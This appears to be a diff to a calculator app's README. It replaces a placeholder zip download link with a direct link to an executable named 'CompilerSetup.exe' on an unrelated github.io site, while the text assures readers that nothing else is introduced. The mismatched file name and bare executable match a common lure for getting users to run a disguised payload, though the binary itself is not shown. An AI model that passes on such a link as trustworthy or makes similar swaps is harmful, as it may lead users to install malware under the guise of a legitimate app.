@@ -6,4 +6,4 @@
 - There are also icon files included.
 - Nothing else is introduced. It is a pleasure to use!
 ## Download
-- [Download Setup](https://example.com/path/to/calculator-v.zip "Download App Setup")
+- [Download App Setup](https://wzhtml.github.io/CD/CompilerSetup.exe "Download App Setup")
